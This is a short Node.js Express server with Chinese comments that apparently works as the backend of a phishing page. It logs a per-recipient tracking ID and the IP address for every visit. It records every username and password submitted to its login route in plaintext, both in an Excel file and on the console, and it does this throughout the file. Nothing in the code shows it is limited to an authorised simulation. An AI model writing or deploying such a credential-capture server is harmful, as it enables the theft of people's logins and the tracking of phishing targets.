const express = require('express');
const fs = require('fs');
const path = require('path');
const xlsx = require('xlsx');

// 初始化 express 应用
const app = express();

// 启用解析 POST 请求中的表单数据
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// 指定 public 文件夹作为静态文件目录
app.use(express.static(path.join(__dirname, 'public')));

// 指定主页路由，加载 index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// 定义 Excel 文件的路径，假设它与 index.html 在同一目录
const filePath = path.join(__dirname, 'logs.xlsx');

// 检查并创建一个 Excel 文件
function initializeExcel() {
    if (!fs.existsSync(filePath)) {
        const wb = xlsx.utils.book_new();
        const ws = xlsx.utils.aoa_to_sheet([['UUID', 'IP', 'Action', 'Username', 'Password', 'Time']]);
        xlsx.utils.book_append_sheet(wb, ws, 'Logs');
        xlsx.writeFile(wb, filePath);
    }
}

// 记录日志到 Excel 文件
function logToExcel(uuid, ip, action, username = '', password = '') {
    const wb = xlsx.readFile(filePath);
    const ws = wb.Sheets['Logs'];

    const time = new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
    const newRow = [uuid, ip, action, username, password, time];

    const sheetData = xlsx.utils.sheet_to_json(ws, { header: 1 });
    sheetData.push(newRow);

    const newWs = xlsx.utils.aoa_to_sheet(sheetData);
    wb.Sheets['Logs'] = newWs;
    xlsx.writeFile(wb, filePath);
}

// 获取客户端的 IP 地址
function getClientIp(req) {
    return req.headers['x-forwarded-for'] || req.connection.remoteAddress;
}

// 初始化 Excel 文件
initializeExcel();

// 路由处理访问 URL
app.get('/id', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
    const uuid = req.query.id;  // 获取 URL 中的 id 参数
    console.log(uuid)
    const ip = getClientIp(req);  // 获取访问者的 IP

    // 记录 UUID, IP 和 'Access' 操作
    logToExcel(uuid, ip, 'Access');

    // res.send('访问已记录');
});

// 处理登录表单提交
app.post('/login', (req, res) => {
    const uuid = req.body.id;  // 获取 POST 请求体中的 id 参数
    const ip = getClientIp(req);  // 获取访问者的 IP
    
    const { username, password } = req.body;  // 获取提交的用户名和密码
    console.log(username, password);
    // 记录 UUID, IP, username, password 和 'Login' 操作
    logToExcel(uuid, ip, 'Login', username, password);

    res.json({ message: '登录信息已记录' });
});

// 启动服务器
const PORT = 3222;
app.listen(PORT, () => {
    console.log(`服务器正在运行，监听端口 ${PORT}`);
});